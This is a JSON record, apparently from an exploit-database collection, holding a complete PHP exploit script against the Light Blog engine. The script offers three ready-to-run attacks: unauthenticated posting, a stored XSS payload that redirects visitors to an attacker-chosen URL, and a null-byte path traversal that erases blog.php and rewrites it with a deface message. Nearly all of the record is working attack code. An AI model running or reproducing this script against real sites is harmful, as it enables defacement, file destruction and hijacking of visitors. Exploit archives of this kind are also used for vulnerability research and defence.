{
  "id": "2658",
  "title": "Light Blog Remote - Multiple Vulnerabilities",
  "cve": null,
  "vuln_type": "xss_reflected",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"\\r\\n\";\r\necho \"Light Blog Multiple Vulnerabilities Exploit\\r\\n\";\r\necho \"by BlackHawk <hawkgotyou@gmail.com>\\r\\n\";\r\necho \"Thanks to rgod for the php code and Marty for the Love\\r\\n\\r\\n\";\r\nif ($argc<4) {\r\necho \"Usage: php \".$argv[0].\" Site Path AttackType Related\\r\\n\";\r\necho \"Host:             target server (ip/hostname)\\r\\n\";\r\necho \"Path:             path to LightBlog\\r\\n\";\r\necho \"AttackType:       1 - Create New Post (Title must be of one word)\\r\\n\";\r\necho \"            |-> Related: Title Post\\r\\n\";\r\necho \"            |-> Es: php \".$argv[0].\" localhost /blog/ 1 Hacked I Got You\\r\\n\\r\\n\";\r\necho \"          2 - Deface Blog (With XSS)\\r\\n\";\r\necho \"            |-> Related: WebPage\\r\\n\";\r\necho \"            |-> Es: php \".$argv[0].\" localhost /blog/ 2 http://site.com/\\r\\n\\r\\n\";\r\necho \"          3 - Deface Blog (Deleting blog.php)\\r\\n\";\r\necho \"            |-> Related: NickName\\r\\n\";\r\necho \"            |-> Es: php \".$argv[0].\" localhost /blog/ 3 BlackHawk\\r\\n\\r\\n\";\r\necho \"\";\r\necho \"\\r\\n\";\r\necho \"\";\r\ndie;\r\n}\r\n\r\n/*\r\nThere are some critical vulnerabilities in this quite simple Blog Engine..\r\n\r\n1 - You do not need to know the right password to send a new Post (no cecking);\r\n2 - You can erase (even with mq=on) all file that are stored on the server:\r\n\r\n[...]\r\n$t = stripslashes($t);\r\n[...]\r\n$fc = fopen (\"blog_comments/$t.txt\", \"w\");\r\nfwrite ($fc, \"\");\r\n[...]\r\n\r\n3-Using point No 1 you can do some XSS couse there isn't any anti-Xss code for admins\r\n4-If mq=on than you can deface the site (but no injecting PHP cause < and > are properly parsed)\r\n\r\nsorry for my bad english,\r\n\r\nBlackHawk hawkgotyou@gmail.com\r\n*/\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n $result='';$exa='';$cont=0;\r\n for ($i=0; $i<=strlen($string)-1; $i++)\r\n {\r\n  if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n  {$result.=\"  .\";}\r\n  else\r\n  {$result.=\"  \".$string[$i];}\r\n  if (strlen(dechex(ord($string[$i])))==2)\r\n  {$exa.=\" \".dechex(ord($string[$i]));}\r\n  else\r\n  {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n  $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n global $proxy, $host, $port, $html, $proxy_regex;\r\n if ($proxy=='') {\r\n   $ock=fsockopen(gethostbyname($host),$port);\r\n   if (!$ock) {\r\n     echo 'No response from '.$host.':'.$port; die;\r\n   }\r\n }\r\n else {\r\n       $c = preg_match($proxy_regex,$proxy);\r\n   if (!$c) {\r\n     echo 'Not a valid proxy...';die;\r\n   }\r\n   $parts=explode(':',$proxy);\r\n   echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n   $ock=fsockopen($parts[0],$parts[1]);\r\n   if (!$ock) {\r\n     echo 'No response from proxy...';die;\r\n       }\r\n }\r\n fputs($ock,$packet);\r\n if ($proxy=='') {\r\n   $html='';\r\n   while (!feof($ock)) {\r\n     $html.=fgets($ock);\r\n   }\r\n }\r\n else {\r\n   $html='';\r\n   while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n     $html.=fread($ock,1);\r\n   }\r\n }\r\n fclose($ock);\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$attack_type=$argv[3];\r\n$port=80;\r\n$proxy=\"\";\r\n\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\nswitch($attack_type)\r\n{\r\ncase 1: //Insert New Post\r\n$title=$argv[4];\r\n$message=\"\";\r\nfor ($i=5; $i<=$argc-1; $i++){\r\n$message.=\" \".$argv[$i];\r\n}\r\n$title=urlencode($title);\r\n$message=urlencode($message);\r\necho \"Attack No 1 - Sending New Post..\\r\\n\";\r\n$data=\"t=$title\";\r\n$data.=\"&c=$message\";\r\n$data.=\"&Submit=Post\";\r\n$packet=\"POST \".$p.\"LightBlog/blog_script.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"/blog.php\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\necho \"Ok, Post Sent\";\r\nbreak;\r\n\r\ncase 2: // Deface With XSS\r\n$dfc_url=$argv[4];\r\n$deface_url=urlencode(\"<script>window.location=('$dfc_url')</script>\");\r\necho \"Attack No 2 - Sending New Post With XSS..\\r\\n\";\r\n$data=\"t=$deface_url\";\r\n$data.=\"&c=msg\";\r\n$data.=\"&Submit=Post\";\r\n$packet=\"POST \".$p.\"LightBlog/blog_script.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"/blog.php\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\necho \"Ok, Post Sent\";\r\nbreak;\r\n\r\nbreak;\r\ncase 3: // Defacing the original blog.php file\r\n$nickname=$argv[4];\r\n$packet =\"GET \".$p.\"LightBlog/blog_comments.php?comment=Comment&title=title HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n$temp=explode(\"name=\\\"rand\\\" id=\\\"rand\\\" value=\\\"\",$html);\r\n$temp2=explode(\"\\\"></input>\",$temp[1]);\r\n$random_code = $temp2[0];\r\n$temp=explode(\"name=\\\"rand\\\" id=\\\"rand\\\" value=\\\"$random_code\\\"></input>\",$html);\r\n$temp2=explode(\" \",$temp[1]);\r\n$small_code = $temp2[0];\r\n\r\n\r\n$data=\"t=../../blog.php%00\";\r\n$data.=\"&c=ciao\";\r\n$data.=\"&Submit=Post\";\r\n$packet=\"POST \".$p.\"/LightBlog/blog_script.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"/blog.php\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\necho \"blog.php File erased\\r\\n\";\r\n\r\n// This part will work only if mq=off elsewhere the exploit will only delete blog.php\r\n$deface_text=urlencode(\"|:. $nickname got you! .:\");\r\n$signature=urlencode(\" BlackHawk And Piggy-Marty Rulez info --> <hawkgotyou@gmail.com>\");\r\n$packet =\"GET \".$p.\"LightBlog/add_comment_script.php?name=$deface_text&comment=$signature&rand=$random_code&val=$small_code&Submit=Submit&title=../../blog.php/%00 HTTP/1.0\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"blog.php\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\necho \"Ok, Blog Defaced\";\r\nbreak;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-10-27]",
  "url": "https://www.exploit-db.com/exploits/2658"
}